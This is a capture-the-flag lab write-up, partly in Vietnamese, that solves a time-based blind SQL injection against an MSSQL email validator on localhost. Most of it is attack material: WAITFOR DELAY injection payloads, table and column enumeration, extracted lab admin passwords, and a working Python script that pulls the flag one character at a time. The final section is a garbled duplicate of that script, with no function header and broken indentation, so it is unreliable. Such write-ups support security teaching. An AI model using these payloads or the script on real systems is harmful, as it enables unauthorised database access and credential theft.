# SQLi-030: MSSQL Time-based - WAITFOR DELAY - Writeup

## Flag: `FLAG{w41tf0r_d3l4y_mssql}`

---

## 🔍 Bước 1: DETECT

Test email validation endpoint với time delay:

```bash
# Normal request - fast response
curl "http://localhost:5030/validate?email=test@test.com"

# Test MSSQL WAITFOR DELAY
curl "http://localhost:5030/validate?email=test'; WAITFOR DELAY '0:0:5'--"
```

→ Response chậm ~5s = **MSSQL Time-based Blind confirmed!**

---

## 🎯 Bước 2: IDENTIFY DATABASE

**MSSQL Syntax:**

- Time delay: `WAITFOR DELAY '0:0:5'` (format: 'hours:minutes:seconds')
- Conditional: `IF (condition) WAITFOR DELAY '0:0:3'`

```bash
# Check database name length
curl "http://localhost:5030/validate?email=test'; IF (LEN(DB_NAME())=7) WAITFOR DELAY '0:0:3'--"
# ~3s delay → database name có 7 ký tự

# Extract first character
curl "http://localhost:5030/validate?email=test'; IF (SUBSTRING(DB_NAME(),1,1)='e') WAITFOR DELAY '0:0:3'--"
# ~3s → ký tự đầu = 'e'
```

→ Database: **emaildb**

---

## 🔢 Bước 3: ENUMERATE TABLES

### 3.1. Đếm số bảng

**⚠️ MSSQL không hỗ trợ LIMIT/OFFSET - Dùng NOT IN với TOP**

```http
GET /validate?email=test'; IF ((SELECT COUNT(*) FROM information_schema.tables WHERE table_catalog='emaildb')=3) WAITFOR DELAY '0:0:5'-- HTTP/1.1
```

→ ~5s delay → Có **3 bảng**

### 3.2. Lấy tên bảng

**Bảng 1:**

```http
GET /validate?email=test'; IF (SUBSTRING((SELECT TOP 1 table_name FROM information_schema.tables WHERE table_catalog='emaildb'),1,1)='§a§') WAITFOR DELAY '0:0:5'-- HTTP/1.1
```

**Bảng 2 (skip first 1):**

```http
GET /validate?email=test'; IF (SUBSTRING((SELECT TOP 1 table_name FROM information_schema.tables WHERE table_catalog='emaildb' AND table_name NOT IN (SELECT TOP 1 table_name FROM information_schema.tables WHERE table_catalog='emaildb')),1,1)='§e§') WAITFOR DELAY '0:0:5'-- HTTP/1.1
```

**Bảng 3 (skip first 2):**

```http
GET /validate?email=test'; IF (SUBSTRING((SELECT TOP 1 table_name FROM information_schema.tables WHERE table_catalog='emaildb' AND table_name NOT IN (SELECT TOP 2 table_name FROM information_schema.tables WHERE table_catalog='emaildb')),1,1)='§f§') WAITFOR DELAY '0:0:5'-- HTTP/1.1
```

**Kết quả:**

- admin_users
- email_subscribers
- flags

---

## 🗂️ Bước 4: ENUMERATE COLUMNS

### 4.1. Columns của bảng `flags`

**Cột 1:**

```http
GET /validate?email=test'; IF (SUBSTRING((SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name='flags'),1,1)='§i§') WAITFOR DELAY '0:0:5'-- HTTP/1.1
```

**Cột 2 (skip first 1):**

```http
GET /validate?email=test'; IF (SUBSTRING((SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name='flags' AND column_name NOT IN (SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name='flags')),1,1)='§n§') WAITFOR DELAY '0:0:5'-- HTTP/1.1
```

**Cột 3 (skip first 2):**

```http
GET /validate?email=test'; IF (SUBSTRING((SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name='flags' AND column_name NOT IN (SELECT TOP 2 column_name FROM information_schema.columns WHERE table_name='flags')),1,1)='§v§') WAITFOR DELAY '0:0:5'-- HTTP/1.1
```

**Kết quả:**

- id
- name
- value

---

## 📤 Bước 5: EXTRACT PASSWORD

```http
GET /validate?email=test'; IF (SUBSTRING((SELECT TOP 1 password FROM admin_users),1,1)='§M§') WAITFOR DELAY '0:0:5'-- HTTP/1.1
```

**Credentials:**

- mssql_admin : MSSQL_W41tF0r_P@ss!
- delay_user : D3l4y_Us3r_2024

---

## 🏆 Bước 6: EXFILTRATE FLAG

```http
GET /validate?email=test'; IF (SUBSTRING((SELECT value FROM flags WHERE name='sqli_030'),1,1)='§F§') WAITFOR DELAY '0:0:5'-- HTTP/1.1
```

🎉 **FLAG:** `FLAG{w41tf0r_d3l4y_mssql}`

---

## 🤖 Exploit Script

```python
import requests
import time

URL = "http://localhost:5030/validate"
DELAY = 3
THRESHOLD = 2.5

def check(condition):
    start = time.time()
    payload = f"test'; IF ({condition}) WAITFOR DELAY '0:0:{DELAY}'--"
    try:
        r = requests.get(URL, params={"email": payload}, timeout=10)
        elapsed = time.time() - start
        return elapsed > THRESHOLD
    except:
        return False

def extract_string(query, max_len=100):
    result = ""
    charset = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_{}-@!#$%^&*()"

    for pos in range(1, max_len + 1):
        found = False
        for char in charset:
            condition = f"SUBSTRING(({query}),{pos},1)='{char}'"
            print(f"[*] Position {pos}: '{char}'...", end='\r')

            if check(condition):
                result += char
                print(f"[+] Found: {result}                    ")
                found = True
                break

        if not found:
            break

    return result

# Extract flag
print("[*] Extracting flag...")
flag_query = "SELECT value FROM flags WHERE name='sqli_030'"
flag = extract_string(flag_query, max_len=40)
print(f"\n🎉 FLAG: {flag}")
```

---

## 🔑 MSSQL Key Points

| Feature       | MSSQL Syntax                                    |
| ------------- | ----------------------------------------------- |
| Time delay    | `WAITFOR DELAY '0:0:5'` (hours:minutes:seconds) |
| Conditional   | `IF (condition) WAITFOR DELAY '0:0:3'`          |
| Pagination    | `TOP 1 ... NOT IN (SELECT TOP N ...)`           |
| Current DB    | `DB_NAME()`                                     |
| String length | `LEN(string)`                                   |
| Comments      | `--`, `/**/` (NO # symbol)                      |

    start = time.time()
    payload = f"test'; IF ({cond}) WAITFOR DELAY '0:0:2'--"
    requests.get(f"http://localhost:5030/validate?email={payload}")
    return time.time() - start > 1.5

flag = ""
for pos in range(1, 30):
for c in "FLAG{}\_0123456789abcdefghijklmnopqrstuvwxyz":
if check(f"(SELECT SUBSTRING(value,{pos},1) FROM flags)='{c}'"):
flag += c
print(f"[+] {flag}")
break

```

```
